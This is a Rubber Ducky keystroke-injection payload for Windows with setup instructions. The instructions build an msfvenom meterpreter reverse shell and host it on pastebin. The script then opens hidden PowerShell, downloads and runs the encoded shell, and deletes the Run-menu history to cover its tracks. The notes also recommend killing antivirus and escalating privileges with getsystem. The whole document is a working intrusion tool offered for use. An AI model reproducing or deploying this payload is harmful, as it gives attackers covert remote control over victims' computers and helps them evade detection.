* Author: Finianb1 + @0xCoto

* Target: Windows 10, probably works on Windows 7

* Description: Makes a meterpreter reverse shell by downloading base64 from pastebin. Clears run menu history afterwards.

* Configuration: Generate payload using this command: ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f psh-cmd --smallest```  Cut the payload down to JUST the base64. Upload to pastebin, my example: [https://pastebin.com/KQpwbiRS](https://pastebin.com/KQpwbiRS). Then, simply convert this URL to a raw URL by adding a /raw/ in it (https://pastebin.com/raw/KQpwbiRS) or by clicking on the "raw" button and copying the link. Now you have your URL!  
You can URL shorten it if you'd like, just make sure you use the raw link and not the normal pastebin link. Now change the ```$u='YOUR_LINK'``` to your URL (e.g. ```$u='https://pastebin.com/raw/KQpwbiRS'```). Then simply upload it to your rubber ducky, and you can get extremely fast shells.

* NOTE: It is recommended you migrate the shell and kill antivirus as soon as possible, as most antiviruses will pick up on a meterpreter shell and kill it. Running ```getsystem``` command on meterpreter is also great, but only works on Windows 7 and below (at least to my knowledge).

```
REM Opens a meterpreter using a pastebin link
REM See https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/remote_access/SingleSecondShell/readme.md
REM For how to create a link to your personal shellcode
DELAY 2000
GUI r
DELAY 1000
STRING powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
ENTER
GUI r
DELAY 1000
STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"